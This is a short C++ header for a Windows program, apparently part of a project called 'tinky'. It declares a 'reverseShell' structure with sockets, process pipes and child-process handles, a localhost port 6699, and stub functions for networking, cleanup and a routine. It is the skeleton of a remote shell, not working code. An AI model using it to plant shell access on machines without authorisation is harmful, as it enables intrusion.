#pragma once

#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>

#define HOSTNAME "localhost"
#define PORT "6699"

#define BUFFER_SIZE 4096

#define PROCESS_STOP "Global\\stop_tinky_processes"

#define CONTINUE 1
#define SUCCESS 1
#define FAILURE 0

typedef struct reverseShell {
	// socket {
	addrinfo	addrHints;
	addrinfo	*addrResult;

	SOCKET		listenSocket;
	SOCKET		clientSocket;
	// }

	// pipe {
	HANDLE					childRead ;
	HANDLE					parentWrite;

	HANDLE					childWrite;
	HANDLE					parentRead;

	SECURITY_ATTRIBUTES		secAttributes;
	// }

	// childProcess {
	STARTUPINFOW			startupInfo;
	PROCESS_INFORMATION		processInfo;
	// }

	HANDLE					stopEventsignal;

	BOOL				clientFound;
	CRITICAL_SECTION	lock;

}	reverseShell_t;

// =============== utils ===============
void journalReport(std::wstring msg);
BOOL processShouldStop(void);
// =============== networking.cpp ===============
BYTE initNetworking(void);
//BYTE acceptClient(void);
// =============== cleanUp.cpp ===============
void cleanUp(std::wstring name);
// =============== routine.cpp ===============
BYTE startRoutine(void);